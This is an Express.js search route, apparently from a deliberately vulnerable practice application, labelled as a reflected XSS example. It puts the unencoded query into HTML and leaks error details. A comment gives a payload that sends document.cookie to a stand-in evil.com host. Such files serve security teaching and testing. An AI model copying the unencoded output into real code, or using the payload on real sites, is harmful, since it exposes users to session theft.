// ============================================================
// VULNERABILITY #2: Reflected XSS (CWE-79)
// User input reflected in response without sanitization
// ============================================================

const express = require('express');
const router = express.Router();
const { getDatabase } = require('../config/database');

// VULNERABLE: XSS - user input reflected directly in HTML response
// GET /api/search?q=<script>alert('xss')</script>
router.get('/', (req, res) => {
  const { q } = req.query;

  if (!q) {
    return res.status(400).json({ error: 'Search query parameter "q" is required' });
  }

  try {
    const db = getDatabase();
    const results = db.prepare(
      'SELECT id, owner_name, account_type FROM accounts WHERE owner_name LIKE ?'
    ).all(`%${q}%`);

    // VULNERABLE: User input reflected directly in HTML without encoding
    // An attacker can inject: ?q=<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
    const html = `
      <html>
        <head><title>Search Results</title></head>
        <body>
          <h1>Search Results for: ${q}</h1>
          <p>Found ${results.length} results</p>
          <ul>
            ${results.map(r => `<li>${r.owner_name} - ${r.account_type}</li>`).join('')}
          </ul>
        </body>
      </html>
    `;

    res.setHeader('Content-Type', 'text/html');
    res.send(html);
  } catch (err) {
    res.status(500).json({ error: 'Search error', details: err.message });
  }
});

module.exports = router;
